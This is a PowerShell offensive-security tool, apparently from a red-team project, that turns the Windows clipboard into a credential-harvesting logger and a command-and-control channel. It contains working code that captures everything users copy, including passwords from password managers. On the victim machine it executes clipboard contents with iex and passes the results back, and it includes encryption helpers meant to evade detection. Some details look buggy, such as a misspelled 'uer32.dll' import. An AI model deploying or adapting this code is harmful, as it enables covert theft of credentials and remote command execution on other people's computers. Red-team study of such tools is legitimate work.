$CIPHER = "adaDASDaksjldasnjkds;ldkflsdmkafmwfm" # Encryption in the commands so if they are caught they dont get the command or output of the results.
$commandkey = "kljsdsouiwjlkksjksadoie" #commands need a validation step for the key value for access just incase mutiple sessions - v2 Update.
#$Key = $(Create-AesKey)
<#
.SYNOPSIS
Functions: Invoke-ClipboardLogger, Invoke-ClipboardC2C, Invoke-ClipboardC2V
Author: Adam Crompton, Twitter: @3nc0d3r
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION
Invoke-Clipboard is a set of PowerShell tools that weaponizes the Windows clipboard.  Invoke-Clipboard has two methods of being called; one for clipboard logging/harvesting (Invoke-Clipboard Logger) and the other for establishing a Command and Control (C2C) channel over the clipboard (Invoke-ClipboardC2C and Invoke-ClipboardC2V).

.PARAMETER message 
Switch: Outputs the data as text instead of objects, good if you are using this script through a backdoor.
	
.EXAMPLE
Invoke-ClipboardLogger

Invoke-ClipboardC2C -message "gwmi Win32_Process"

Invoke-ClipboardC2V

.NOTES
How Invoke-Clipboard Works

Invoke-ClipboardLogger only function is to read from the clipboard and return results for anything that was sent to the clipboard either programmatically or by the user. This can be very useful on a Red Team assessment, as it helps operators profile the target’s daily activities, steal credentials from password safes and any other data sent to the clipboard. In conjunction with a keylogger and timestamped screenshots,  attackers can now build a catalog of credentials and associated applications. 

Invoke-ClipboardC2V is the clipboard parsing portion of the C2 running on the victim. This is the script that is deployed on the victim to capture new commands sent by Invoke-ClipboardC2C, execute them on the victim system and return the output to the clipboard for retrieval by Invoke-ClipboardC2C.

Invoke-ClipboardC2C is the client portion of the Command and Control (C2) infrastructure. After a command, the client will sleep until clipboard buffer has changed. Once the clipboard buffer has changed, the results are parsed and sent to the C2 operator.

.LINK

Blog: https://www.inguardians.com/2019/02/06/all-your-copy-paste-are-belong-to-us/
Github repo: https://github.com/inguardians/Invoke-Clipboard
Resources Used:
    - StringToHGlobalUni - https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.stringtohglobaluni(v=vs.110).aspx
    - GetClipboardData - https://msdn.microsoft.com/en-us/library/windows/desktop/ms649039(v=vs.85).aspx
    - ClipboardFormats - https://msdn.microsoft.com/en-us/library/windows/desktop/ms649013(v=vs.85).aspx#_win32_Standard_Clipboard_Formats
        - #define CF_UNICODETEXT      13
        - #define CF_TEXT             1
#>
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}
function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $hasher = New-Object System.Security.Cryptography.SHA256Managed
    $toHash = [System.Text.Encoding]::UTF8.GetBytes($CIPHER)
    $hashBytes = $hasher.ComputeHash($toHash)
    $final = [System.Convert]::ToBase64String($hashBytes)
    return $final
}
function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}
function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function encryptme([string]$message, [byte[]]$Key){
  #Convert Password to a secure string
  $SecureString = ConvertTo-SecureString -AsPlainText -Force -String $message
  
  #Convert SecureString to an encrypted string using the encryption key
  $EncryptedString = ConvertFrom-SecureString -SecureString $SecureString -Key $Key
  return $EncryptedString
}
function decryptme([string]$message, [byte[]]$Key){
  $EncryptedString = $message
  $StandardString = ConvertTo-SecureString -String $EncryptedString -Key $Key
  return ((New-Object System.Management.Automation.PSCredential 'N/A', $StandardString).GetNetworkCredential().Password)
}

function import-dllz{
$dllimp = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern IntPtr GetClipboardData(uint uFormat);

[DllImport("uer32.dll", SetLastError = true)]
static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern bool OpenClipboard(IntPtr hWndNewOwner);

[DllImport("user32.dll")]
public static extern bool CloseClipboard();

[DllImport("user32.dll")]
public static extern bool SetClipboardData(uint uFormat, IntPtr data);

[DllImport("user32.dll")]
static extern IntPtr GetOpenClipboardWindow();

[DllImport("user32.dll")]
public static extern bool EmptyClipboard();
"@
$showWindowAsync = Add-Type -memberDefinition $dllimp -name "pwnsauce" -namespace AtomME -passThru -Language CSharp
}

function Get-OpenClipWIN()
{
    $a = [AtomMe.pwnsauce]::GetOpenClipboardWindow()
    write-host "This is getOpenClip $a"
}

function push_cb ([string]$pushtoclip){
    $a = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($pushtoclip)
    [AtomMe.pwnsauce]::OpenClipboard([IntPtr]::Zero)
    #emptyClipboard()
    [AtomMe.pwnsauce]::EmptyClipboard()
    [AtomMe.pwnsauce]::SetClipboardData(13 , $a)
    [AtomMe.pwnsauce]::CloseClipboard()

}

function get_cb()
{
    #$codetextANSI = 1
    #$codetextOEM = 7
    $codetextUNI = 13

    # Open the Clipboard
    [AtomMe.pwnsauce]::OpenClipboard([IntPtr]::Zero)

    # GetCliboard data
    $getclipUNI = [AtomMe.pwnsauce]::GetClipboardData($codetextUNI)
    
    $stringUNI = [Runtime.InteropServices.Marshal]::PtrToStringUni($getclipUNI)

    #Close the clipboard
    [AtomMe.pwnsauce]::CloseClipboard()
    return $stringUNI
    }

function Invoke-ClipboardLogger(){
    import-dllz
    $delaymin = 1
    $delaymax = 2
    $old = ""
    while ($true){
    	while ($(get_cb)[2] -eq $old){
    		Start-Sleep -s (Get-Random -minimum $delaymin  -maximum $delaymax)
    		}
    	   $(get_cb)[2]  | Out-string
           $old = $(get_cb)[2]
    	}
}

function Invoke-ClipboardC2V
{
    import-dllz
    $ErrorActionPreference = 'SilentlyContinue'
    $delaymin = 1
    $delaymax = 4
    $old = $(get_cb)[2]
    $oldclip = $(get_cb)[2]
    $key = (13,4,2,13,0,34,254,222,1,1,2,23,42,54,33,99,1,34,2,7,6,5,12,111)
    while ($true){
        $holder_before_modclip = $(get_cb)[2]
    	while ($(get_cb)[2] -eq $old){
    		  Start-Sleep -s (Get-Random -minimum $delaymin -maximum $delaymax)
    	}
        Get-OpenClipWIN
        Try{
            write-host "Running command"
            
        	$result = iex $(get_cb)[2]  | Out-string
            write-host "This is the result: $result"

        	push_cb $result

            sleep 5

            push_cb $holder_before_modclip
        }
        Catch{
            write-host "Not a correct command " 
        }
        $old = $(get_cb)[2]
    }
}


function Invoke-ClipboardC2C ([string]$message)
{
    import-dllz
    $original = $(get_cb)[2]
    push_cb $message
    $ErrorActionPreference = 'SilentlyContinue'
    $delaymin = 1
    $delaymax = 2
    $old = $(get_cb)[2]
    $oldclip = ""
    Try{
        while ($(get_cb)[2] -eq $old){
            Start-Sleep -s (Get-Random -minimum $delaymin  -maximum $delaymax)
            write-host $(get_cb)[2]
        }
    }
    Catch
    {
        write-host "Command does not exist!!"
    }
}
